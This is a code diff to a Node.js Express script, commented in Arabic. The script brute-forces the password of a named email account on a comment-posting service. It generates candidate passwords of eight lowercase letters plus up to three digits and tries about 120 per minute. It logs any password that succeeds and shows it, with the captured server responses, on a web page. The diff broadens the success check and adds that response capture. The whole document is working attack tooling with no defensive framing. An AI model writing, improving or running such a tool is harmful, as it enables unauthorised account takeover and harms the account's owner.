@@ -5,7 +5,7 @@ const fetch = require("node-fetch");
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-let email = "soos1412123@gmail.com";
+let email = "SOOS1412123@gmail.com";
 let commentText = "TTTT";
 let commentsPerMinute = 120;
 let delay = (60 / commentsPerMinute) * 1000;
@@ -24,6 +24,7 @@ let tryingManual = true;
 
 let foundPassword = null;
 let currentPassword = "";
+let successfulResponses = []; // لتخزين الردود الناجحة
 
 // توليد كلمات مرور 8 حروف صغيرة + 0–3 أرقام
 function generatePassword() {
@@ -87,9 +88,19 @@ async function attemptPassword(pwd) {
       continue;
     }
 
-    if (typeof res.data === "string" && !res.data.includes("login failed")) {
+    if (
+      typeof res.data === "string"
+        ? !res.data.includes("login failed")
+        : res.data?.status === 1 &&
+          String(res.data?.message).includes("تم أضافة تعليقك")
+    ) {
       foundPassword = pwd;
       console.log(`✅ تم العثور على الباسورد الصحيح: ${pwd}`);
+      console.log("📥 الرد الكامل:", res.data);
+      successfulResponses.push({
+        pwd,
+        response: res.data
+      });
       return true;
     } else {
       console.log(`❌ تجربة: ${pwd}`);
@@ -119,9 +130,11 @@ function startBrute() {
 // ✅ صفحة الواجهة
 app.get("/", (req, res) => {
   if (foundPassword) {
-    res.send(
-      `<h1 style="color:lime">✅ الباسورد الصحيح: <b>${foundPassword}</b></h1>`
-    );
+    res.send(`
+      <h1 style="color:lime">✅ الباسورد الصحيح: <b>${foundPassword}</b></h1>
+      <h2>📥 الردود الناجحة:</h2>
+      <pre style="background:#111;color:#0f0;padding:10px">${JSON.stringify(successfulResponses, null, 2)}</pre>
+    `);
   } else if (!tryingManual) {
     res.send(
       `<h1 style="color:red">❌ انتهت المحاولات دون إيجاد الباسورد الصحيح.</h1>`
